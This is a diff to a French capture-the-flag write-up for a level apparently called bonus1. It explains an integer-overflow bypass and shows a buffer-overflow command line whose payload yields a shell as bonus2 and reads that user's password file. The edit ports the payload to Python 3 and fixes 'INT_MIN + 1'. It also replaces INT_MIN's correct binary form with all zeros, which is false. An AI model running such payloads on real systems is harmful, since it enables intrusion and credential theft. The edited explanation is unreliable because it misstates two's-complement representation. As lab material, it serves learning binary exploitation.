@@ -72,9 +72,9 @@ En utilisant la calculette de Windows cependant, pour essayer des opérations d�
 
 Et en effet, multiplier par 4 revient à faire un `n << 2`, donc, puisque la représentation binaire de `-2147483648` (INT_MIN) est :
 
-`10000000000000000000000000000000`, après un left-shift de 2 bit, devient : `00000000000000000000000000000000`, soit 0.
+`00000000000000000000000000000000`, après un left-shift de 2 bit, devient : `00000000000000000000000000000000`, soit 0.
 
-Donc, puisque la représentation binaire de `-2147483647` (INT_MIN - 1) est : `10000000000000000000000000000001`, elle devient `00000000000000000000000000000100`, soit 4, après un left-shit de 2 bits (= une multiplication par 4).
+Donc, puisque la représentation binaire de `-2147483647` (INT_MIN + 1) est : `10000000000000000000000000000001`, elle devient `00000000000000000000000000000100`, soit 4, après un left-shit de 2 bits (= une multiplication par 4).
 
 Et ainsi de suite.
 
@@ -97,7 +97,7 @@ result        buffer[40]    overflow sur result
 Et l'essayer : 
 
 ```bash
-$ ./bonus1 -2147483637 `python -c 'print "\x90"*40 + "\x57\x4f\x4c\x46"[::-1]'`
+$ ./bonus1 -2147483637 `python -c 'print("\x90"*40 + "\x57\x4f\x4c\x46"[::-1])'`
 $ whoami
 bonus2
 $ cat /home/user/bonus2/.pass
